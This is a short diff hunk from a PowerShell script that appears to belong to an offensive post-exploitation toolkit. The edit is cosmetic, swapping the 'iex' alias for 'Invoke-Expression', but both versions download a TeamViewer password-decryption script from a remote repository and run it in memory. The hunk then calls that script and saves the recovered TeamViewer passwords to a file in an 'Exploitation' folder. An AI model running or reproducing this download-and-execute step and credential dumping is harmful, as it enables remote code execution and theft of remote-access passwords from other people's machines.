@@ -790,7 +790,7 @@ function Decryptteamviewer
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     if(!$consoleoutput){pathcheck}
     # Wrote this Script myself, credit goes to @whynotsecurity - https://whynotsecurity.com/blog/teamviewer/
-    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/TeamViewerDecrypt/master/TeamViewerDecrypt.ps1')
+    Invoke-Expression (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/TeamViewerDecrypt/master/TeamViewerDecrypt.ps1')
     if(!$consoleoutput){
         TeamviewerDecrypt >> $currentPath\Exploitation\TeamViewerPasswords.txt
         Get-Content $currentPath\Exploitation\TeamViewerPasswords.txt
